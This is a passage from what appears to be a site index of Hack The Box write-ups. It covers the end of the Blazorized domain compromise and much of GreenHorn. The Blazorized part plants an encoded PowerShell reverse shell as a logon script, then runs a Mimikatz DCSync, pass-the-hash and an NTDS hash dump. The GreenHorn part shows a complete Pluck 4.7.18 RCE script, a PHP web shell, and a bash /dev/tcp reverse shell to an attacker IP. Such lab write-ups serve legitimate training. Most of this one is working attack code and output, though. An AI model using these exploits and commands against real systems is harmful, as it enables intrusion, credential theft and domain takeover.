vAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==' &gt; shelly.bat\n</code></pre> <p>Following this we upload it to the victim host using the <code>WinRM</code> upload functionality. Then copy it to the target path <code>\\\\blazorized.htb\\sysvol\\blazorized.htb\\scripts\\A32FF3AEAA23</code> that we discovered we have full access to.</p> <pre><code>*Evil-WinRM* PS C:\\Programdata\\xpltive&gt; upload ./tools/shelly.bat\n\nInfo: Uploading /home/kali/htb/blazorized/tools/shelly.bat to C:\\Programdata\\xpltive\\shelly.bat\n\nData: 1848 bytes of 1848 bytes copied\n\nInfo: Upload successful!\n*Evil-WinRM* PS C:\\Programdata\\xpltive&gt; cp shelly.bat \\\\blazorized.htb\\sysvol\\blazorized.htb\\scripts\\A32FF3AEAA23\\shelly.bat\n</code></pre> <p>Finally we start our listener to catch the connection attempt and set the script path for the target domain user <code>ssa_6010</code> using <code>Set-DomainObject</code> of <code>PowerView</code>.</p> <pre><code>*Evil-WinRM* PS C:\\Programdata\\xpltive&gt; Set-DomainObject SSA_6010 -Set @{'scriptPath'='A32FF3AEAA23\\shelly.bat'} -Verbose\n*Evil-WinRM* PS C:\\Programdata\\xpltive&gt; Get-DomainObject -Identity SSA_6010   \n\n\nlogoncount            : 3410\nbadpasswordtime       : 6/19/2024 9:58:18 AM\ndistinguishedname     : CN=SSA_6010,CN=Users,DC=blazorized,DC=htb\nobjectclass           : {top, person, organizationalPerson, user}\ndisplayname           : SSA_6010\nlastlogontimestamp    : 1/17/2025 3:16:08 PM\nuserprincipalname     : SSA_6010@blazorized.htb\nname                  : SSA_6010\nobjectsid             : S-1-5-21-2039403211-964143010-2924010611-1124\nsamaccountname        : SSA_6010\ncodepage              : 0\nsamaccounttype        : USER_OBJECT\naccountexpires        : NEVER\ncountrycode           : 0\nwhenchanged           : 1/18/2025 2:03:12 AM\ninstancetype          : 4\nusncreated            : 29007\nobjectguid            : 8bf3166b-e716-4f91-946c-174e1fb433ed\nlastlogoff            : 12/31/1600 6:00:00 PM\nobjectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb\ndscorepropagationdata : {6/19/2024 1:24:50 PM, 6/14/2024 12:40:41 PM, 6/14/2024 12:40:28 PM, 6/14/2024 12:38:20 PM...}\nmemberof              : {CN=Super_Support_Administrators,CN=Users,DC=blazorized,DC=htb, CN=Remote Management Users,CN=Builtin,DC=blazorized,DC=htb}\nlastlogon             : 1/17/2025 8:03:10 PM\ncn                    : SSA_6010\nbadpwdcount           : 0\nscriptpath            : A32FF3AEAA23\\shelly.bat\nuseraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD\nwhencreated           : 1/10/2024 2:32:00 PM\nprimarygroupid        : 513\npwdlastset            : 2/25/2024 11:56:55 AM\nusnchanged            : 357071\n</code></pre> <p>And after some time we will catch the shell on our listener as <code>ssa_6010</code> on the <code>DC1</code> host.</p> <pre><code>$ rlwrap -cAr nc -lvnp 6666\nlistening on [any] 6666 ...\nconnect to [10.10.16.33] from (UNKNOWN) [10.129.231.74] 52427\n\nPS C:\\Windows\\system32&gt; whoami\nblazorized\\ssa_6010\nPS C:\\Windows\\system32&gt; hostname\nDC1\n</code></pre>"}, {"location": "Write-Ups/Blazorized/#domain-compromise", "title": "Domain Compromise", "text": "<p>From our previous <code>BloodHound</code> data we see that the <code>SUPER_SUPPORT_ADMINISTRATORS</code> group, the now compromised user <code>ssa_6010</code> is member of, has <code>DCSync</code> rights on the <code>blazorized.htb</code> domain.</p> <p></p> <p>We leverage this to obtain the NTLM hash of the domain administrator using <code>Mimikatz</code>. We transfer the tool over and perform the <code>DCSync</code> attack; targeting the domain administrator.</p> <pre><code>PS C:\\ProgramData\\xpltive&gt; .\\mimikatz.exe \"lsadump::dcsync /user:Administrator /domain:blazorized.htb\" exit                                 \n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       &gt; https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz(commandline) # lsadump::dcsync /user:Administrator /domain:blazorized.htb\n[DC] 'blazorized.htb' will be the domain\n[DC] 'DC1.blazorized.htb' will be the DC server\n[DC] 'Administrator' will be the user account\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n\nObject RDN           : Administrator\n\n** SAM ACCOUNT **\n\nSAM Username         : Administrator\nAccount Type         : 30000000 ( USER_OBJECT )\nUser Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )\nAccount expiration   : \nPassword last change : 2/25/2024 11:54:43 AM\nObject Security ID   : S-1-5-21-2039403211-964143010-2924010611-500\nObject Relative ID   : 500\n\nCredentials:\n  Hash NTLM: f55ed1465179ba374ec1cad05b34a5f3\n&lt;--SNIP--&gt;\n</code></pre> <p>We proceed with a pass-the-hash attack and dump the NTDS domain database using <code>Netexec</code>.</p> <pre><code>$ nxc smb dc1.blazorized.htb -u Administrator -H f55ed1465179ba374ec1cad05b34a5f3\nSMB         10.129.231.74   445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:blazorized.htb) (signing:True) (SMBv1:False)\nSMB         10.129.231.74   445    DC1              [+] blazorized.htb\\Administrator:f55ed1465179ba374ec1cad05b34a5f3 (Pwn3d!)\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/htb/blazorized]\n\u2514\u2500$ nxc smb dc1.blazorized.htb -u Administrator -H f55ed1465179ba374ec1cad05b34a5f3 --ntds\n[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user &lt;user&gt; to dump a specific user safely or the module -M ntdsutil [Y/n] \nSMB         10.129.231.74   445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:blazorized.htb) (signing:True) (SMBv1:False)\nSMB         10.129.231.74   445    DC1              [+] blazorized.htb\\Administrator:f55ed1465179ba374ec1cad05b34a5f3 (Pwn3d!)\nSMB         10.129.231.74   445    DC1              [+] Dumping the NTDS, this could take a while so go grab a redbull...\nSMB         10.129.231.74   445    DC1              Administrator:500:aad3b435b51404eeaad3b435b51404ee:f55ed1465179ba374ec1cad05b34a5f3:::\nSMB         10.129.231.74   445    DC1              Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nSMB         10.129.231.74   445    DC1              krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a001ebf25825cadb6b423a2d28378467:::\nSMB         10.129.231.74   445    DC1              blazorized.htb\\RSA_4810:1107:aad3b435b51404eeaad3b435b51404ee:381b793bde4dea233ae34bb1d9ce38f5:::\nSMB         10.129.231.74   445    DC1              blazorized.htb\\NU_1056:1109:aad3b435b51404eeaad3b435b51404ee:abe496a00e60878932c084c9db511f94:::\nSMB         10.129.231.74   445    DC1              blazorized.htb\\NU_1057:1110:aad3b435b51404eeaad3b435b51404ee:59e98e58c973a5cb2b125a17ff91b6a8:::\nSMB         10.129.231.74   445    DC1              blazorized.htb\\NU_1058:1111:aad3b435b51404eeaad3b435b51404ee:6ac2dfc65463962ed19b653b409046ba:::\nSMB         10.129.231.74   445    DC1              blazorized.htb\\NU_1055:1117:aad3b435b51404eeaad3b435b51404ee:63001e8b2d13ee358ad7d6de4590fed3:::\nSMB         10.129.231.74   445    DC1              blazorized.htb\\RSA_4811:1118:aad3b435b51404eeaad3b435b51404ee:4368391035803bf58273e1273692285b:::\nSMB         10.129.231.74   445    DC1              blazorized.htb\\RSA_4812:1120:aad3b435b51404eeaad3b435b51404ee:c66e4531c81de604e3531018fdad81cb:::\nSMB         10.129.231.74   445    DC1              blazorized.htb\\RSA_4813:1121:aad3b435b51404eeaad3b435b51404ee:2c84dfeb21e075dc5fc2c56447bdf9d6:::\nSMB         10.129.231.74   445    DC1              blazorized.htb\\RSA_4814:1122:aad3b435b51404eeaad3b435b51404ee:e7ddd56fabdb8fb1ebe6c43ff5fe815a:::\nSMB         10.129.231.74   445    DC1              blazorized.htb\\SSA_6010:1124:aad3b435b51404eeaad3b435b51404ee:798d0354e026fd168b91063f09184c9f:::\nSMB         10.129.231.74   445    DC1              blazorized.htb\\SSA_6011:1125:aad3b435b51404eeaad3b435b51404ee:be1ce1381c084dc4cda8159a665b3c59:::\nSMB         10.129.231.74   445    DC1              blazorized.htb\\SSA_6012:1126:aad3b435b51404eeaad3b435b51404ee:08db7bd0f2482f4e4cb0b1f6864f88e1:::\nSMB         10.129.231.74   445    DC1              blazorized.htb\\SSA_6013:1127:aad3b435b51404eeaad3b435b51404ee:ef37b4e655b62e664b6f9ae67133f2e6:::\nSMB         10.129.231.74   445    DC1              blazorized.htb\\LSA_3211:1128:aad3b435b51404eeaad3b435b51404ee:7c8fed15e80ed63db789ad740cda2f18:::\nSMB         10.129.231.74   445    DC1              blazorized.htb\\LSA_3212:1129:aad3b435b51404eeaad3b435b51404ee:72bab07816477b4aeffca4f709efbaa5:::\nSMB         10.129.231.74   445    DC1              blazorized.htb\\LSA_3213:1131:aad3b435b51404eeaad3b435b51404ee:e80b666e0ee68cd0a6516a92e75231cc:::\nSMB         10.129.231.74   445    DC1              DC1$:1002:aad3b435b51404eeaad3b435b51404ee:4b4ed5dfaa22dc4e41c279c0c62b9ee2:::\nSMB         10.129.231.74   445    DC1              [+] Dumped 20 NTDS hashes to /home/kali/.nxc/logs/DC1_10.129.231.74_2025-01-18_031048.ntds of which 19 were added to the database\nSMB         10.129.231.74   445    DC1              [*] To extract only enabled accounts from the output file, run the following command: \nSMB         10.129.231.74   445    DC1              [*] cat /home/kali/.nxc/logs/DC1_10.129.231.74_2025-01-18_031048.ntds | grep -iv disabled | cut -d ':' -f1\nSMB         10.129.231.74   445    DC1              [*] grep -iv disabled /home/kali/.nxc/logs/DC1_10.129.231.74_2025-01-18_031048.ntds | cut -d ':' -f1\n</code></pre> <p>The root flag can now be obtained at <code>C:\\Users\\Administrator\\Desktop\\root.txt</code>.</p> <pre><code>$ nxc smb dc1.blazorized.htb -u Administrator -H f55ed1465179ba374ec1cad05b34a5f3 -x \"type C:\\Users\\Administrator\\Desktop\\root.txt\"\nSMB         10.129.231.74   445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:blazorized.htb) (signing:True) (SMBv1:False)\nSMB         10.129.231.74   445    DC1              [+] blazorized.htb\\Administrator:f55ed1465179ba374ec1cad05b34a5f3 (Pwn3d!)\nSMB         10.129.231.74   445    DC1              [+] Executed command via wmiexec\nSMB         10.129.231.74   445    DC1              48b522165eef12c73c34205c205de8ac\n</code></pre>"}, {"location": "Write-Ups/GreenHorn/", "title": "GreenHorn", "text": ""}, {"location": "Write-Ups/GreenHorn/#initial-enumeration", "title": "Initial Enumeration", "text": ""}, {"location": "Write-Ups/GreenHorn/#nmap", "title": "Nmap", "text": "<p>Start the enumeration with Nmap, gathering ports and services available.</p> <p>As always <code>-p-</code> and <code>--min-rate 10000</code> to catch all ports, and once acquired we enumerate further.</p> <pre><code>$ sudo nmap -sC -sV -p22,80,3000 -vv -oN nmap 10.129.87.59\n# Nmap 7.94SVN scan initiated Fri Dec  6 13:43:07 2024 as: /usr/lib/nmap/nmap -sC -sV -p22,80,3000 -oN nmap -vv 10.129.87.59\nNmap scan report for 10.129.87.59\nHost is up, received echo-reply ttl 63 (0.023s latency).\nScanned at 2024-12-06 13:43:08 CET for 93s\n\nPORT     STATE SERVICE REASON         VERSION\n22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOp+cK9ugCW282Gw6Rqe+Yz+5fOGcZzYi8cmlGmFdFAjI1347tnkKumDGK1qJnJ1hj68bmzOONz/x1CMeZjnKMw=\n|   256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZQbCc8u6r2CVboxEesTZTMmZnMuEidK9zNjkD2RGEv\n80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://greenhorn.htb/\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n3000/tcp open  ppp?    syn-ack ttl 63\n| fingerprint-strings: \n|   GenericLines, Help, RTSPRequest: \n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest: \n|     HTTP/1.0 200 OK\n|     Cache-Control: max-age=0, private, must-revalidate, no-transform\n|     Content-Type: text/html; charset=utf-8\n|     Set-Cookie: i_like_gitea=6d4e351f0099e873; Path=/; HttpOnly; SameSite=Lax\n|     Set-Cookie: _csrf=D80EaSvmwOqhy1QQwN41klKKPKU6MTczMzQ4ODk5NTYyMDg2MjQ2Nw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax\n|     X-Frame-Options: SAMEORIGIN\n|     Date: Fri, 06 Dec 2024 12:43:15 GMT\n|     &lt;!DOCTYPE html&gt;\n|     &lt;html lang=\"en-US\" class=\"theme-auto\"&gt;\n|     &lt;head&gt;\n|     &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;\n|     &lt;title&gt;GreenHorn&lt;/title&gt;\n|     &lt;link rel=\"manifest\" href=\"data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX\n|   HTTPOptions: \n|     HTTP/1.0 405 Method Not Allowed\n|     Allow: HEAD\n|     Allow: GET\n|     Cache-Control: max-age=0, private, must-revalidate, no-transform\n|     Set-Cookie: i_like_gitea=c7418bc923bfd1c3; Path=/; HttpOnly; SameSite=Lax\n|     Set-Cookie: _csrf=LUNQtcvrdIyfLW65LWplcX-lApE6MTczMzQ4OTAwMTAzNDY4Mzk3NA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax\n|     X-Frame-Options: SAMEORIGIN\n|     Date: Fri, 06 Dec 2024 12:43:21 GMT\n|_    Content-Length: 0\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port3000-TCP:V=7.94SVN%I=7%D=12/6%Time=6752F162%P=x86_64-pc-linux-gnu%r\nSF:(GenericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x\nSF:20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Ba\nSF:d\\x20Request\")%r(GetRequest,1000,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nCache-Contr\nSF:ol:\\x20max-age=0,\\x20private,\\x20must-revalidate,\\x20no-transform\\r\\nCo\nSF:ntent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nSet-Cookie:\\x20i_like_git\nSF:ea=6d4e351f0099e873;\\x20Path=/;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nSet-Coo\nSF:kie:\\x20_csrf=D80EaSvmwOqhy1QQwN41klKKPKU6MTczMzQ4ODk5NTYyMDg2MjQ2Nw;\\x\nSF:20Path=/;\\x20Max-Age=86400;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nX-Frame-Opt\nSF:ions:\\x20SAMEORIGIN\\r\\nDate:\\x20Fri,\\x2006\\x20Dec\\x202024\\x2012:43:15\\x\nSF:20GMT\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\\"en-US\\\"\\x20class=\\\"the\nSF:me-auto\\\"&gt;\\n&lt;head&gt;\\n\\t&lt;meta\\x20name=\\\"viewport\\\"\\x20content=\\\"width=dev\nSF:ice-width,\\x20initial-scale=1\\\"&gt;\\n\\t&lt;title&gt;GreenHorn&lt;/title&gt;\\n\\t&lt;link\\x\nSF:20rel=\\\"manifest\\\"\\x20href=\\\"data:application/json;base64,eyJuYW1lIjoiR\nSF:3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6\nSF:Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmh\nSF:vcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLC\nSF:JzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvY\nSF:X\")%r(Help,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t\nSF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x\nSF:20Request\")%r(HTTPOptions,197,\"HTTP/1\\.0\\x20405\\x20Method\\x20Not\\x20All\nSF:owed\\r\\nAllow:\\x20HEAD\\r\\nAllow:\\x20GET\\r\\nCache-Control:\\x20max-age=0,\nSF:\\x20private,\\x20must-revalidate,\\x20no-transform\\r\\nSet-Cookie:\\x20i_li\nSF:ke_gitea=c7418bc923bfd1c3;\\x20Path=/;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nS\nSF:et-Cookie:\\x20_csrf=LUNQtcvrdIyfLW65LWplcX-lApE6MTczMzQ4OTAwMTAzNDY4Mzk\nSF:3NA;\\x20Path=/;\\x20Max-Age=86400;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nX-Fra\nSF:me-Options:\\x20SAMEORIGIN\\r\\nDate:\\x20Fri,\\x2006\\x20Dec\\x202024\\x2012:4\nSF:3:21\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(RTSPRequest,67,\"HTTP/1\\\nSF:.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=\nSF:utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\");\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nRead data files from: /usr/share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Fri Dec  6 13:44:41 2024 -- 1 IP address (1 host up) scanned in 93.80 seconds\n</code></pre> <ul> <li>TTL of 63 possibly indicating Linux and no containers in use</li> <li>Port 22 SSH and showing us Ubuntu Linux</li> <li>Port 80 HTTP redirects to <code>http://greenhorn.htb/</code></li> <li>Port 3000 HTTP reveals <code>gitea</code> with cookies</li> </ul>"}, {"location": "Write-Ups/GreenHorn/#port-80", "title": "Port 80", "text": "<p>We add <code>greenhorn.htb</code> to our <code>/etc/hosts</code> file and browse to the website.</p> <p><code>http://greenhorn.htb/?file=welcome-to-greenhorn</code> </p> <p>From the footer we can see the pluck CMS is being used by the website.</p> <p>We can also see the <code>file</code> parameter being used, which we can quickly check for an LFI vulnerability. We try it with the payload <code>../../../../../../etc/passwd</code> but get blocked:</p> <p></p> <p>We can also try to fingerprint the version of pluck being used. We do this by issuing the <code>curl</code> command:</p> <pre><code>$ curl -s 'http://greenhorn.htb/?file=welcome-to-greenhorn' | grep -i pluck\n\n&lt;meta name=\"generator\" content=\"pluck 4.7.18\" /&gt;\n                                &lt;a href=\"/login.php\"&gt;admin&lt;/a&gt; | powered by &lt;a href=\"http://www.pluck-cms.org\"&gt;pluck&lt;/a&gt;\n</code></pre> <p>And we see the instance is running version 4.7.18, which is vulnerable to a stored XSS as well as an RCE. However it is an authenticated RCE, so we need to be logged in (see Exploitation).</p>"}, {"location": "Write-Ups/GreenHorn/#port-3000", "title": "Port 3000", "text": "<p>Next up we can check the Gitea website running on port 3000.</p> <p></p> <p>We browse to <code>Explore</code> and find the <code>GreenHorn</code> repository being publicly accessible. </p> <p></p> <p>It is safe to assume that this is the source code for the website running on port 80.</p> <p>Browsing through the repository we can find sensitive information being exposed in the <code>pass.php</code> file:</p> <p></p> <p>This is most likely a password hash and looking like SHA. To get the correct SHA-X we count the characters:</p> <pre><code>$ echo 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163' | wc -c\n129\n</code></pre> <p>This is a SHA-512 hash and we conclude this because SHA-512 means 512 bits, thus meaning 64 bytes. The hash is represented in hex format, so 128 characters matches the 64 bytes.</p> <p>We try decrypting it the easy way with CrackStation first, before going with <code>Hashcat</code>.</p> <p></p> <p>And it successfully cracks as <code>iloveyou1</code>.</p> <p>We try password reuse on the pluck instance on port 80 and get successfully logged in. This allows us to proceed with the RCE exploit.</p> <p></p> <p></p>"}, {"location": "Write-Ups/GreenHorn/#exploitation", "title": "Exploitation", "text": "<p>Running a quick <code>searchsploit</code> check reveals an RCE as well as stored XSS vulnerability for the version of pluck used by the website:</p> <pre><code>$ searchsploit pluck 4.7.18\n------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                                                                                         |  Path\n------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nPluck v4.7.18 - Remote Code Execution (RCE)                                                                                                                                                                                                            | php/webapps/51592.py\npluck v4.7.18 - Stored Cross-Site Scripting (XSS)                                                                                                                                                                                                      | php/webapps/51420.txt\n------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\nPapers: No Results\n</code></pre> <p>Info</p> <p>In the following are two ways to achieve successful remote code execution, by using the proof-of-concept RCE script as well as by writing our own Python script.</p> Proof-of-Concept RCEOwn RCE <p>We copy the RCE to our working directory</p> <pre><code>$ searchsploit -m php/webapps/51592.py\nExploit: Pluck v4.7.18 - Remote Code Execution (RCE)\n    URL: https://www.exploit-db.com/exploits/51592\n    Path: /usr/share/exploitdb/exploits/php/webapps/51592.py\n    Codes: N/A\nVerified: False\nFile Type: Python script, Unicode text, UTF-8 text executable\nCopied to: /home/kali/htb/greenhorn/51592.py\n</code></pre> <p>For the exploit to work, we need to find the <code>login.php</code> and <code>admin.php</code> pages, as defined in the script. Luckily they can be easily found by just browsing to <code>http://greenhorn.htb/login.php</code> and same for and <code>http://greenhorn.htb/admin.php</code>.</p> <p>Next is to adjust the script to our situation by editing the <code>login_url</code>, <code>upload_url</code> and <code>rce_url</code> variables as well as change the password we found for the <code>login_payload</code> variable. We use the <code>greenhorn.htb</code> host instead of <code>localhost</code> and adjust the URIs.</p> 51592.py<pre><code>import requests\nfrom requests_toolbelt.multipart.encoder import MultipartEncoder\n\nlogin_url = \"http://greenhorn.htb/login.php\"\nupload_url = \"http://greenhorn.htb/admin.php?action=installmodule\"\nheaders = {\"Referer\": login_url,}\nlogin_payload = {\"cont1\": \"admin\",\"bogus\": \"\",\"submit\": \"Log in\"}\n\nfile_path = input(\"ZIP file path: \")\n\nmultipart_data = MultipartEncoder(\n    fields={\n        \"sendfile\": (\"mirabbas.zip\", open(file_path, \"rb\"), \"application/zip\"),\n        \"submit\": \"Upload\"\n    }\n)\n\nsession = requests.Session()\nlogin_response = session.post(login_url, headers=headers, data=login_payload)\n\n\nif login_response.status_code == 200:\n    print(\"Login account\")\n\n\n    upload_headers = {\n        \"Referer\": upload_url,\n        \"Content-Type\": multipart_data.content_type\n    }\n    upload_response = session.post(upload_url, headers=upload_headers, data=multipart_data)\n\n\n    if upload_response.status_code == 200:\n        print(\"ZIP file download.\")\n    else:\n        print(\"ZIP file download error. Response code:\", upload_response.status_code)\nelse:\n    print(\"Login problem. response code:\", login_response.status_code)\n\n\nrce_url=\"http://greenhorn.htb/data/modules/mirabbas/miri.php\"\n\nrce=requests.get(rce_url)\n\nprint(rce.text)\n</code></pre> <p>Before running the exploit we need to create our payload as a PHP file and create a ZIP archive with it. The script above uses the filenames <code>miri.php</code> for the PHP and <code>mirabbas.zip</code> for the ZIP file name, so we mirror these names.</p> <p>For our PHP file we create a simple PHP web shell:</p> <pre><code>&lt;?php system($_GET[\"cmd\"]); ?&gt;\n</code></pre> <p>And save it as <code>miri.php</code>.</p> <pre><code>$ echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; miri.php\n</code></pre> <p>Next we zip it up.</p> <pre><code>$ zip mirabbas.zip miri.php\n</code></pre> <p>We are now ready to run the exploit.</p> <p><pre><code>$ python3 51592.py\nZIP file path: /home/kali/htb/greenhorn/mirabbas.zip\nLogin account\nZIP file download.\n</code></pre> And we get successful code execution by browsing to:</p> <p><pre><code>http://greenhorn.htb/data/modules/mirabbas/miri.php?cmd=id\n</code></pre> </p> <p>Having code execution confirmed, we can now get a reverse shell connection in order to more easily interact with the target host.</p> <pre><code>$ curl -s 'http://greenhorn.htb/data/modules/mirabbas/miri.php' --get --data-urlencode \"cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.11/7777 0&gt;&amp;1'\"\n</code></pre> <p>And we successfully get a reverse shell connection established on our listener:</p> <pre><code>$ rlwrap -cAr nc -lvnp 7777\nlistening on [any] 7777 ...\nconnect to [10.10.16.11] from (UNKNOWN) [10.129.87.59] 44768\nbash: cannot set terminal process group (996): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@greenhorn:~/html/pluck/data/modules/mirabbas$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\nwww-data@greenhorn:~/html/pluck/data/modules/mirabbas$ hostname\ngreenhorn\n</code></pre> <p>From the found RCE we can copy the URLs and write our own script. The script can also be found on my GitHub.</p> exploit.py<pre><code>import requests\nimport argparse\nfrom termcolor import colored\nimport zipfile\nimport os\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"Exploit Pluck v4.7.18 RCE Vulnerability\")\n    parser.add_argument(\"--target\",required=True,help=\"Target URL (Example: http://greenhorn.htb)\")\n    parser.add_argument(\"--password\",required=True,help=\"Pluck password\")\n    parser.add_argument(\"--cmd\",help=\"Command to execute\")\n    args = parser.parse_args()\n\n    # Create payload\n    filename = 'malicious'\n    print(f\"[+] Creating payload {filename}.zip\")            \n    with open(f'{filename}.php','w') as _file:\n        _file.write('&lt;?php system($_GET[\"cmd\"]); ?&gt;')\n    with zipfile.ZipFile(f'{filename}.zip','w') as _zip:\n        _zip.write(f'{filename}.php')\n    os.remove(f'{filename}.php')\n\n    target = args.target.rstrip('/')\n    # URLs \n    login_url = f\"{target}/login.php\"\n    upload_url = f\"{target}/admin.php?action=installmodule\"\n    rce_url = f\"{target}/data/modules/{filename}/{filename}.php\"\n\n    with requests.Session() as sess:\n        # Login\n        print(f\"[+] Logging in\")\n        login_post = sess.post(login_url,data={\"cont1\":f\"{args.password}\",\"bogus\":\"\",\"submit\":\"Log+in\"})\n        if \"Password incorrect\" in login_post.text:\n            print(colored(f\"[!] Login failed using password {args.password}\",'red'))\n            return\n        print(f\"[+] Login successful\")\n\n        print(f\"[+] Uploading {filename}.zip\")\n\n        # Upload malicious ZIP\n        req = sess.post(upload_url, data={\"submit\":\"Upload\"}, files={\"sendfile\":open(f'{filename}.zip', 'rb')})\n\n        # Check successful command execution\n        req = sess.get(f'{rce_url}?cmd=id')\n        if not (req.status_code == 200):\n            print(colored(f\"[!] Exploit might have failed\\n[!] Check {rce_url}\",'yellow'))\n            os.remove(f'{filename}.zip')\n            return\n\n        print(colored(f\"[+] Upload successful\\n[+] Access web shell at {rce_url}?cmd=&lt;COMMAND&gt;\",'green'))\n        # Execute user-supplied command\n        if args.cmd:\n            print(f\"[+] Executing command \\'{args.cmd}\\'\\n\")\n            cmd_encoded = requests.utils.quote(args.cmd)\n            req = sess.get(f\"{rce_url}?cmd={cmd_encoded}\")\n            print(req.text)\n\n        os.remove(f'{filename}.zip')\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> <p>Then we can run the exploit, specifying the command we wish to execute. In this case we choose to execute a command that will establish a reverse shell connection to our listener.</p> <pre><code>$ python3 pluck-rce.py --target http://greenhorn.htb --password iloveyou1 --cmd \"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.11/7777 0&gt;&amp;1'\"\n[+] Creating payload malicious.zip\n[+] Logging in\n[+] Login successful\n[+] Uploading malicious.zip\n[+] Upload successful\n[+] Access web shell at 